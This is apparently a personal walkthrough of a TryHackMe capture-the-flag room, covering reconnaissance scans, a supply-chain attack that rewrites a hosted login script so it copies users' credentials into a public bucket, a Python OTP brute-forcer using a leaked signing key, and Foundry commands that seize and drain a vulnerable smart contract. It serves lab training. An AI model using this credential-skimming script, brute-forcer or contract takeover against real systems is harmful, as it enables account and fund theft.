<h1 align="center">TryHack3M: TriCipher Summit</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/c343b580-87d4-41ba-8608-536321007e44"><br>
2025, September 13<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>498</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Reach the apex of this triple-crypto challenge</em>!<br>
Access it <a href="https://tryhackme.com/room/tryhack3mencryptionchallenge">here</a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/b68e37e4-e4ed-4cfb-a41d-422134ce14bb"></p>

<h1>Task 1 . Find the TryHack3M Flags</h1>
<p>Step into the realm of TryHackM3 as we approach 3 million users, where '3 is the magic number'! Embark on the TryHackM3 challenge, intercepting credentials, cracking custom crypto, hacking servers, and breaking into smart contracts to steal the 3 million. Are you ready for the cryptography ultimate challenge?<br>

In this challenge, you will be expected to:<br>

- Perform supply chain attacks<br>
- Reverse engineer cryptography<br>
- Hack a crypto smart contract<br>

Press the Start Machine button and wait at least 5 minutes for the VM to boot up properly.</p>

<p><em>Answer the questions below</em></p>

<h2>nmap</h2>
<p>

- &nbsp;&nbsp;&nbsp;<strong>22</strong> &nbsp; ・ &nbsp; SSH<br>
- &nbsp;&nbsp;&nbsp;<strong>80</strong> &nbsp; ・ &nbsp; HTTP &nbsp;&nbsp; ・ &nbsp; WebSockify Python/3.8.10<br>
- &nbsp;<strong>443</strong> &nbsp;      ・ &nbsp; HTTPS &nbsp;            ・ &nbsp; nginx 1.25.4 &nbsp; ・ &nbsp; cdn.tryhackm3.loc<br>
- <strong>5000</strong> &nbsp;           ・ &nbsp; HTTPS &nbsp;            ・ &nbsp; Werkzeug/3.0.2 Python/3.8.10 &nbsp; ・ &nbsp; ECorp Super Secret Super Secure Login<br>
- <strong>8000</strong> &nbsp;           ・ &nbsp; HTTP &nbsp;&nbsp;       ・ &nbsp; nginx 1.25.4<br>
- <strong>9444</strong> &nbsp;           ・ &nbsp; HTTPS &nbsp;            ・ &nbsp; wso2esb-console?</p>

```bash
:~/TriCipherSummit# nmap -sC -sV -Pn -n -p- -T4 xx.xxx.xx.xx
...
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http             WebSockify Python/3.8.10
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: WebSockify Python/3.8.10
|     Date: Sat, 13 Sep 2025 xx:xx:xx GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 472
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 405</p>
|     <p>Message: Method Not Allowed.</p>
|     <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 501 Unsupported method ('OPTIONS')
|     Server: WebSockify Python/3.8.10
|     Date: Sat, 13 Sep 2025 xx:xx:xx GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 500
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 501</p>
|     <p>Message: Unsupported method ('OPTIONS').</p>
|     <p>Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.</p>
|     </body>
|_    </html>
|_http-server-header: WebSockify Python/3.8.10
|_http-title: Error response
443/tcp  open  ssl/http         nginx 1.25.4
|_http-server-header: nginx/1.25.4
|_http-title: Site doesn't have a title (application/xml).
| ssl-cert: Subject: commonName=cdn.tryhackm3.loc/organizationName=TryHackMe3/stateOrProvinceName=Trimento/countryName=AU
| Not valid before: 2024-04-03T04:52:12
|_Not valid after:  2025-04-03T04:52:12
| tls-alpn: 
|_  http/1.1
5000/tcp open  ssl/upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.2 Python/3.8.10
|     Date: Sat, 13 Sep 2025 xx:xx:xx GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1222
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <title>ECorp Super Secret Super Secure Login</title>
|     <link rel="stylesheet" href="static/bootstrap.min.css">
|     </head>
|     <body>
|     <div class="container">
|     <div class="row justify-content-center mt-5">
|     <div class="col-md-6">
|     <div class="card">
|     <div class="card-header">
|     Login
|     </div>
|     <div class="card-body">
|     <form id="login-form">
|     <div class="form-group">
|     <label for="username">Username</label>
|     <input type="text" id="username" name="username" class="form-control" required>
|     </div>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.2 Python/3.8.10
|     Date: Sat, 13 Sep 2025 xx:xx:xx GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
| ssl-cert: Subject: commonName=*/organizationName=Dummy Certificate
| Subject Alternative Name: DNS:*
| Not valid before: 2025-09-13Txx:xx:xx
|_Not valid after:  2026-09-13Txx:xx:xx
8000/tcp open  http             nginx 1.25.4
|_http-server-header: nginx/1.25.4
|_http-title: Site doesn't have a title (application/xml).
9444/tcp open  wso2esb-console?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: application/xml
|     cache-control: no-cache, max-age=0
|     last-modified: Sat, 13 Sep 2025 xx:xx:xx GMT
|     server: 7cbb9dd73e39
|     P3P: CP="This site does not have a p3p policy."
|     vary: origin
|     <?xml version="1.0" encoding="UTF-8"?><ListAllMyBucketsResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
|     <hint>Goto: http://null/ui to visit the admin UI</hint>
|     <Owner>
|     <ID>initiatorId</ID>
|     <DisplayName>initiatorName</DisplayName>
|     </Owner>
|     <Buckets>
|     <Bucket>
|     <Name>libraries</Name>
|     <CreationDate>2024-04-05T10:23:05Z</CreationDate>
|     </Bucket>
|     </Buckets>
|     </ListAllMyBucketsResult>
|   HTTPOptions: 
|     HTTP/1.1 500 Internal Server Error
|     content-type: text/html; charset=UTF-8
|     last-modified: Sat, 13 Sep 2025 xx:xx:xx GMT
|     cache-control: no-cache, max-age=0
|     set-cookie: NINJA_SESSION=5c98e1c580fd3567991fd6bdea13b9d8d5b475d3d6b3b9c31df74ec380d03f2e6e2b9fa579cd43d04dd6ea839bba284db20748f9b2ada779072aeccb35813c01:?previousCSRFToken=&CSRFToken=b1105c3e-e58f-4220-89e4-81d6b2ba8ed4&lastCSRFRecompute=1757806809026; Max-Age=7776000; Expires=Fri, 12 Dec 2025 23:40:09 GMT; Path=/; HTTPOnly; SameSite=Lax
|     server: 7cbb9dd73e39
|     P3P: CP="This site does not have a p3p policy."
|     vary: origin
|     content-length: 11088
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Error - S3 ninja</title>
|     <link rel="stylesheet"
|     media="screen"
|_    href="
```

<h2>/etc/hosts</h2>

```bash
xx.xxx.xx.xx  cdn.tryhackm3.loc
```

<h2>gobuster</h2>

```bash
:~/TriCipherSummit# gobuster dir -u https://cdn.tryhackm3.loc:5000/ -w /usr/share/dirb/wordlists/common.txt -t 80 -e -k -q
https://cdn.tryhackm3.loc:5000/login                (Status: 405) [Size: 153]
```

<h2>dirsearch</h2>

```bash
:~/TryHack3M:TriCipherSummit# dirsearch -u https://cdn.tryhackm3.loc:5000/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/TryHack3M:TriCipherSummit/reports/https_cdn.tryhackm3.loc_5000/__25-09-16_xx-xx-xx.txt

Target: https://cdn.tryhackm3.loc:5000/

[xx:xx:xx] Starting: 
[xx:xx:xx] 405 -  153B  - /login

Task Completed
```

<h2>Web port 80</h2>
<p>

- <code>Advanced ...</code><br>
- <code>Accept the Risk and Continue</code><br>
- identified <strong>Goto: http://cdn.tryhackm3.loc/ui</strong> to visit the admin UI</p>

<img width="1063" height="406" alt="image" src="https://github.com/user-attachments/assets/27626446-fe19-4717-97a3-2962f2e84b2e" />

<br>
<br>
<p>

- viewed the Certificate<br>
- confirmed <code>cdn.tryhackm3.loc</code></p>

<img width="1053" height="644" alt="image" src="https://github.com/user-attachments/assets/4b5bde9b-746a-4bdd-a879-e5262318d2d1" />

<br>
<br>

<img width="990" height="625" alt="image" src="https://github.com/user-attachments/assets/fc7ae654-8eee-440f-89a9-b0569cb2716b" />

<br>
<br>

<h2>S3 Ninja UI</h2>
<p>

- navigated to <strong>cdn.tryhackm3.loc/ui</strong><br>
- identified <strong>S3 ninja</strong> Version: 8.3.3., Build: 433 (2024-02-14 10:40), Revision: 75e012cb6689de1921bd07a07c5c886d0a683866<br><strong>Storage Path</strong>: /home/sirius/data (Free: 31.49 GB)<br><strong>Access Keyh</strong>: AKIAIOSFODNN7EXAMPLE<br><strong>Secret Keyh</strong>: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY<br>Public <strong>Bucket</strong>: Libraries</p>

<img width="1062" height="523" alt="image" src="https://github.com/user-attachments/assets/a54beb40-eb41-45cf-ba34-648f8cf43da4" />

<br>
<br>
<h2>Bucket Libraries</h2>
<p>

- identified<br><code>files</code> <strong>auth.js</strong> and <strong>form-submit.js</strong><br><code>features</code> <strong>Make private</strong> and <strong>Upload file</strong><br>specific <code>file features</code> <strong>Properties</strong> and <strong>Delete</strong> clicking on <strong>Actions</strong><br>in the uppper right corner, <strong>Fork me on GitHub</strong> directing to <strong>github.com/scireum/s3ninja</strong><br><strong>Supported Object Methods</strong> and <strong>Supported Multipart Methods</strong> clicking on <strong>Supported API</strong><br>
- identified many occurences of <strong>form-submit.js</strong> clicking on <strong>Access Logs</strong><br>
- launched Burp Suite and enabled FoxyProxy<br>
- navigated to <strong>cdn.tryhackm3.loc/ui/libraries/form-submit.js</strong><br>
- identified that <strong>form-submit.js</strong> is responsible for the <strong>authentication</strong> = /login<br>downloaded <strong>form-submit.js</strong><br>modified <strong>form-submit.js</strong>´s content<br>deleted <strong>form-submit.js</strong> in libraries<br>launched Burp Suite and enabled FoxyProxy<br>uploaded the modified <strong>form-submit.js</strong> in <strong>cdn.tryhackm3.loc/ui/libraries</strong><br>
- identified that <strong>credentials.txt</strong> file was created in <strong>cdn.tryhackm3.loc/ui/libraries</strong><br>
- navigated to <strong>cdn.tryhackm3.loc/ui/libraries/credentials.txt</strong><br>got a congrats message including Flag 1: <em>Congratulations, you got the username and the password, now provide the OTP at /supersecretotp. Flag 1:  THM{*********************************************}</em><br>uncovered an endpoint and S3 Ninja´s credentials<br>credentials . username=TryHackM3&password=*******************<br>endpoint . /supersecretotp<br>
- navigated to <strong>cdn.tryhackm3.loc:5000/supersecretotp</strong><br>viewed its source code<br>identified that <strong>static/form-submit2.js</strong> is responsible for the OTP MFA<br>analyzed it<br>executed a <strong>script.py</strong> file - by <a href="https://jaxafed.github.io/posts/tryhackme_tricipher_summit/">jaxafed</a> - to brute-foce the OTP.<br>
- used the OTP discovered in the previous step to login<br>
- got a message to check API requests<br>
- checked and navigated to cdn.tryhackm3.loc:3000<br>
- executed commands to transfer money using the <strong>transferDeposit</strong> function after discovering the <strong>owner</strong></p>

<p>1.1. What is Flag 1?<br>
<code>THM{*********************************************}</code></p>


<h6>identified<br><code>files</code> <strong>auth.js</strong> and <strong>form-submit.js</strong><br><img width="900px"  src="https://github.com/user-attachments/assets/6f1c2e2a-02b0-4f62-b3bd-90e054b4ea4f"></h6>


<h6>downloaded and modified modified <code>form-submit.js</code><br><img width="900px"  src="https://github.com/user-attachments/assets/dfdd71cd-8763-4fe8-b84f-9dd2491104f6"></h6>

<h6>deleted <code>form-submit.js</code> in libraries<br><img width="900px" src="https://github.com/user-attachments/assets/8a8b3b94-b2c4-4507-b465-09260fb21101"></h6>

<h6>uploaded <code>form-submit.js</code> in libraries and <code>creds.txt</code> was generated<br><img width="900px" src="https://github.com/user-attachments/assets/af3073e5-8b74-46e9-884c-55b71e2d0132"></h6>

<h6>clicked <code>creds.txt</code> and accessed some credentials<br><img width="900px" src="https://github.com/user-attachments/assets/56712184-a068-4b94-a3df-6e750e34eaa6"></h6>

<h6>navigated to cdn.tryhackm3.loc:5000 and logged in<br><img width="900px" src="https://github.com/user-attachments/assets/94ea6534-dc44-433b-b75f-f5cb061f8c1b"></h6>

<h6>got a congrats message<br><img width="900px" src="https://github.com/user-attachments/assets/1290aeee-71cf-4127-b062-b82682faa72a"></h6>

<h6>uncovered an endpoint and S3 Ninja´s credentials through Burp Suite<br><img width="900px" src="https://github.com/user-attachments/assets/63175613-9ee6-4605-9458-70f932742453"></h6>

<h6>navigated to cdn.tryhackm3.loc:5000/supersecretotp and identified static/form-submit2.js<br><img width="900px" src="https://github.com/user-attachments/assets/292dc676-d27a-4a92-9a5a-e04c0df37ee7"></h6>

<h6>used the OTP discovered in the previous step to login<br><img width="900px" src="https://github.com/user-attachments/assets/b9c97a39-d0e5-4851-af18-92a0c635350d"></h6>

<h6>got a message to check API requests<br><img width="900px" src="https://github.com/user-attachments/assets/aa0f923e-7d54-4b5f-84e8-e8f71cae5436"></h6>

<h6>navigated to cdn.tryhackm3.loc:3000/<br><img width="900px" src="https://github.com/user-attachments/assets/3adb1b57-6d7e-4974-98ce-7133d12103e2"></h6>

<br>
<br>

<p><em>form-submit.js</em></p>

```bash
const form = document.querySelector('#login-form');
const privkey = `MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCuL9Yb8xsvKimy
...
lR/MJB2Z2oBXuIvIidHIVxf7+Sl3Y35sU53Vd+D1QOuJByvpLmpczYsQkUMJmKha
...
ibFr+wDYJVOApLm9P/dg5AecXRylUKv/gbbVwBDnkCWrm48H3MY+uLqVBUZ+2jfi
c7A3LDsSigmnDbODU4muEM0Z`
const enc = new TextEncoder()

function str2ab(str) {
    const buf = new ArrayBuffer(str.length);
    const bufView = new Uint8Array(buf);
    for (let i = 0, strLen = str.length; i < strLen; i++) {
      bufView[i] = str.charCodeAt(i);
    }
    return buf;
}

function getPrivateKey() {
    const binaryDerString = window.atob(privkey);
    const binaryDer = str2ab(binaryDerString);
  
    return window.crypto.subtle.importKey(
      "pkcs8",
      binaryDer,
      {
        name: "RSASSA-PKCS1-v1_5",
        hash: "SHA-256",
      },
      true,
      ["sign"]
    );
}

function rot13 (message) {
    const originalAlpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    const cipher = "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM"
    return message.replace(/[a-z]/gi, letter => cipher[originalAlpha.indexOf(letter)])
}

async function getSecretKey(key) {
    return await window.crypto.subtle.importKey("raw", key, "AES-CBC", true,
        ["encrypt", "decrypt"]
    );
}

async function encryptMessage(key, message) {
    iv = enc.encode("0000000000000000").buffer;
    return await window.crypto.subtle.encrypt(
      {
        name: "AES-CBC",
        iv
      },
      key,
      message
    );
}

async function decryptMessage(key, message) {
    iv = enc.encode("0000000000000000").buffer;
    return await window.crypto.subtle.decrypt(
      {
        name: "AES-CBC",
        iv
      },
      key,
      message
    );
}

async function signMessage(privateKey, message) {
    return await window.crypto.subtle.sign(
      "RSASSA-PKCS1-v1_5",
      privateKey,
      message
    );
}

form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const formData = (new FormData(form));
    const formDataObj = {};
    formData.forEach((value, key) => (formDataObj[key] = value));
    console.log(formDataObj)

    const rawAesKey = window.crypto.getRandomValues(new Uint8Array(16));
    let mac = rot13(window.btoa(String.fromCharCode(...rawAesKey)))
    const aesKey = await getSecretKey(rawAesKey)
    const rsaKey = await getPrivateKey()
    let rawdata = "username=" + formDataObj["username"] + "&password=" + formDataObj["password"]
    let data = window.btoa(String.fromCharCode(...new Uint8Array(await encryptMessage(aesKey, enc.encode(rawdata).buffer))))
    let sign = window.btoa(String.fromCharCode(...new Uint8Array(await signMessage(rsaKey, enc.encode(rawdata).buffer))))

    const response = await fetch('/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
        },
        body: "mac=" + encodeURIComponent(mac) + "&data=" + encodeURIComponent(data) + "&sign=" + encodeURIComponent(sign)
    });
    if (response.ok && response.status == 200 && (await response.text()).startsWith("result=")) {
        window.location.href = '/congratulations';
    } else {
        alert('Login failed');
    }
});
```

<p>modified <em>form-submit.js</em></p>

```bash
...
    let rawdata = "username=" + formDataObj["username"] + "&password=" + formDataObj["password"]

    const exfilcreds =  await(fetch('https://cdn.tryhackm3.loc/ui/libraries/?upload&filename=cred.txt', {
        method: 'POST',
        headers: {
            'Content-Type': 'text/plain'
        },
        body: rawdata
    });

    let data = window.btoa(String.fromCharCode(...new Uint8Array(await encryptMessage(aesKey, enc.encode(rawdata).buffer))))
    let sign = window.btoa(String.fromCharCode(...new Uint8Array(await signMessage(rsaKey, enc.encode(rawdata).buffer))))

//  const response = await fetch('/login', {
//      method: 'POST',
//        headers: {
//           'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
//        },
//       body: "mac=" + encodeURIComponent(mac) + "&data=" + encodeURIComponent(data) + "&sign=" + encodeURIComponent(sign)
//   });
...
```

<img width="720" height="362" alt="image" src="https://github.com/user-attachments/assets/175abe5c-2b98-4b20-82e5-2706184d56b9" />

<br>
<br>

<img width="720" height="541" alt="image" src="https://github.com/user-attachments/assets/24f98935-3806-48c8-a958-b330535a0ac8" />

<br>
<br>
<p><em>script.py</em></p>

```bash
:~/TryHack3M:TriCipherSummit# pip3 install pycryptodome
```

```bash
#!/usr/bin/env python3

import requests
import os
from base64 import b64encode, b64decode
from Cryptodome.Signature import PKCS1_v1_5
from Cryptodome.Hash import SHA256
from Cryptodome.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from urllib.parse import unquote
import urllib3
urllib3.disable_warnings()

otp_url = "https://cdn.tryhackm3.loc:5000/supersecretotp"
private_key_b64 = 'MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCuL9Yb8xsvKimylR/MJB2Z2oBXuIvIidHIVxf7+Sl3Y35sU53Vd+D1QOuJByvpLmpczYsQkUMJmKha36ibC2gjB...

def generate_mac(key):
        key_b64 = b64encode(key).decode()
        return rot13(key_b64)

def generate_sign(data):
        private_key = RSA.importKey(b64decode(private_key_b64))
        h = SHA256.new(data.encode('utf-8'))
        return PKCS1_v1_5.new(private_key).sign(h)

def rot13(text):
        result = ''
        for char in text:
                if char.isalpha():
                        shift = 13 if char.islower() else -13
                        encoded = chr((ord(char) - ord('a' if char.islower() else 'A') + shift) % 26 + ord('a' if char.islower() else 'A'))
                        result += encoded
                else:
                        result += char
        return result

def encrypt(data, key):
        iv = b"0000000000000000"
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))

def decrypt(data, key):
        iv = b"0000000000000000"
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(data), AES.block_size)

AES_KEY = os.urandom(16)
mac = generate_mac(AES_KEY)

otp = "1313"
rawdata = "otp=" + otp
data = b64encode(encrypt(rawdata, AES_KEY))
sign = b64encode(generate_sign(rawdata))
payload = {"data": data, "mac": mac, "sign": sign}
r = requests.post(otp_url, data=payload, verify=False)
r = requests.post(otp_url, data=payload, verify=False)
result = unquote(r.text.split("=")[1].rstrip())
result = decrypt(b64decode(result), AES_KEY).decode()
print(f"{otp}: {result}")
```

```bash
:~/TryHack3M:TriCipherSummit# python3 s.py
...
0454: OTP is not `****`
0455: OTP is not `****`
0456: OTP is not `****`
0457: OTP is not `****`
0458: OTP is not `****`
```

<img width="1243" height="130" alt="image" src="https://github.com/user-attachments/assets/51568f3a-9b56-4dc1-b9ec-316f3a4833d1" />

```bash
:~/TryHack3M:TriCipherSummit# python3 s.py
1313: Congratulations, you cracked the OTP, the ledger is now active, please visit port 3000! Flag2: THM{****************************}
```

<br>
<p>1.2. What is Flag 2?<br>
<code>THM{****************************}</code></p>
<br>

<h2>Blockchain Challenge</h2>

<img width="948" height="836" alt="image" src="https://github.com/user-attachments/assets/9498bc13-da17-454c-9777-f21a9793ab7c" />

<br>
<br>

```bash
blockchain
Goal: have the isSolved(0 function return true

Status: DEPLOYED
Player Balance: 1.0 ETH

Player Wallet Address: ******************************************
Private Key: **************************************************
Contract Address: ******************************************

Block Time: 0
RPC URL: http://geth:8545
Chain ID: 1337
```

<h3>/etc/hosts</h3>

```bash
xx.xxx.xx.xx  cdn.tryhackm3.locgeth
```

<h3>The Blockchain Script</h3>

```bash
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Challenge {
    address public owner;
    address public deposit;
    uint256 public constant INITIAL_BALANCE = 3000000;
    bool public you_solved_it = false;

    constructor() {
        deposit = msg.sender;
        owner = msg.sender;
        balances[owner] = INITIAL_BALANCE;
    }

    mapping(address => uint256) public balances;

    function getOwnerBalance() external view returns (uint256) {
        return balances[owner];
    }
    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can transfer the balance");
        _;
    }

    function transferDeposit() onlyOwner external {

        

        uint256 ownerBalance = balances[deposit];
        require(ownerBalance > 0, "Owner has no balance to transfer");

        balances[deposit] = 0;
        balances[owner] += ownerBalance;
        you_solved_it = true;       
    }

    function getBalanceFromAddress(address _address) external returns (uint256) {


       return balances[_address];
    }
   
    function reset(address resetAddress) external  {
        require(resetAddress != address(0), "Invalid address");
        owner = resetAddress;
    }

     function isSolved() external view returns (bool) {
           return you_solved_it;
           
    }

}
```

```bash
:~/TryHack3M:TriCipherSummit# cast call --rpc-url http://geth:8545 [Contract Address] 'owner()'
 0x00000000000000000000000024d14f3bc476b1cbeac2dc33b4feede614d9728f
```

```bash
:~/TryHack3M:TriCipherSummit# cast send --legacy --rpc-url http://geth:8545 --private-key [Private Key] [Contract AddressPrivate Key] 'reset(address)' [Player Wallet]

blockHash               0xad9279e31cf59ba2ebf09e7a9026eb675a4ed4cb81871eef96c42683d47bf45b
blockNumber             3
contractAddress         
cumulativeGasUsed       27603
effectiveGasPrice       1000000000
from                    0xfEF50E71a52c0e8114dae2a3458a0529e71747D7
gasUsed                 27603
logs                    []
logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                    
status                  1 (success)
transactionHash         0x09139ddaf75eeca0703d3f5692e3d15a6b27cee1b273cba4d53f5cc86ab86b1a
transactionIndex        0
type                    0
blobGasPrice            
blobGasUsed             
to                      0xf22cB0Ca047e88AC996c17683Cee290518093574
```

<img width="1241" height="445" alt="image" src="https://github.com/user-attachments/assets/a132c030-fc9d-463d-b0c4-dbed17c2d87d" />

<br>
<br>

```bash
:~/TryHack3M:TriCipherSummit# cast call --rpc-url http://geth:8545 [to] 'owner()'
0x000000000000000000000000fef50e71a52c0e8114dae2a3458a0529e71747d7
```

```bash
:~/TryHack3M:TriCipherSummit# cast send --legacy --rpc-url http://geth:8545 --private-key [Private Key] [to] 'transferDeposit()'

blockHash               0x09944c76f398c968a71899664c3957cb3f317e05d1d75cbb661c9ebfc3980a9f
blockNumber             10
contractAddress         
cumulativeGasUsed       42309
effectiveGasPrice       1000000000
from                    0xfEF50E71a52c0e8114dae2a3458a0529e71747D7
gasUsed                 42309
logs                    []
logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                    
status                  1 (success)
transactionHash         0x1a109ea2e6e94fe8ea49db4212a79436af7d4e0acf4de5364b0cb335dce6b235
transactionIndex        0
type                    0
blobGasPrice            
blobGasUsed             
to                      0xf22cB0Ca047e88AC996c17683Cee290518093574
```

<p>

- click <strong>Get Flag</p>

<br>

<p>1.3. What is Flag 3?<br>
<code>THM********************************}</code></p>


<img width="1056" height="721" alt="image" src="https://github.com/user-attachments/assets/f4e87b09-609b-4e00-8ac2-734a86b253ca" />

<br>
<br>

<img width="1060" height="725" alt="image" src="https://github.com/user-attachments/assets/63e74ce1-53b4-42be-9aed-49616ed54090" />

<br>
<br>
<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/d0b88fc4-f05c-4d8e-b98a-0d3eb8a2bab"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/bd39232e-b329-48fc-9f0a-fa5e8022e932"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, September</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|16      |Hard 🔗 - <code><strong>TryHack3M: TriCipher Summit</strong></code>| 498| 107ᵗʰ| 4ᵗʰ|364ᵗʰ   |     7ᵗʰ    | 126,420  |    966    |    74     |
|16      |Easy 🔗 - Chaining Vulnerabilities     | 498    |     108ᵗʰ    |      5ᵗʰ     |     365ᵗʰ    |     7ᵗʰ    | 126,420  |    965    |    74     |
|15      |Medium 🔗 - AppSec IR                  | 497    |     108ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     7ᵗʰ    | 126,404  |    964    |    74     |
|14      |Hard 🚩 - Misguided Ghosts, in progress| 496    |     108ᵗʰ    |      5ᵗʰ     |     389ᵗʰ    |     6ᵗʰ    | 126,300  |    963    |    74     |
|14      |Hard 🚩 - VulnNet: Endgame             | 496    |     108ᵗʰ    |      5ᵗʰ     |     394ᵗʰ    |     6ᵗʰ    | 126,270  |    963    |    74     |
|13      |Hard 🚩 - Royal Router                 | 495    |     107ᵗʰ    |      5ᵗʰ     |     388ᵗʰ    |     6ᵗʰ    | 126,160  |    962    |    74     |
|13      |Medium 🚩 - Void Execution             | 495    |     107ᵗʰ    |      5ᵗʰ     |     383ʳᵈ    |     6ᵗʰ    | 126,120  |    961    |    73     |
|12      |Easy 🚩 - Invite Only                  | 494    |     110ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     6ᵗʰ    | 126,056  |    960    |    73     |
|12      |Medium 🚩 - Devie                      | 494    |     110ᵗʰ    |      5ᵗʰ     |     607ᵗʰ    |     9ᵗʰ    | 125,606  |    959    |    73     |
|11      |Medium 🚩 - Backtrack, in progress     | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
|11      |Easy 🔗 - Detecting Web Attacks        | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
|10      |Easy 🔗 - Attacking ICS Plant #1       | 492    |     110ᵗʰ    |      5ᵗʰ     |     675ᵗʰ    |     9ᵗʰ    | 125,428  |    957    |    73     |
|10      |Easy 🔗 - SOC Role in Blue Team        | 492    |     110ᵗʰ    |      5ᵗʰ     |     664ᵗʰ    |     9ᵗʰ    | 125,292  |    956    |    73     |
|9       |Hard 🚩 - Python Playground            | 491    |     111ˢᵗ    |      5ᵗʰ     |     693ʳᵈ    |     9ᵗʰ    | 125,236  |    955    |    73     |
|9       |Hard 🚩 - Borderlands                  | 491    |     111ˢᵗ    |      5ᵗʰ     |     713ʳᵈ    |    10ᵗʰ    | 125,146  |    954    |    73     |
|9       |Medium 🚩 - Forgotten Implant          | 491    |     112ⁿᵈ    |      5ᵗʰ     |     660ᵗʰ    |    10ᵗʰ    | 125,016  |    953    |    73     |
|8       |Easy 🔗 - Web Enumeration              | 490    |     112ⁿᵈ    |      5ᵗʰ     |     663ʳᵈ    |    10ᵗʰ    | 124,986  |    952    |    73     |
|8       |Easy 🔗 - iOS: Forensics               | 490    |     113ʳᵈ    |      5ᵗʰ     |     548ᵗʰ    |     9ᵗʰ    | 124,850  |    951    |    73     |
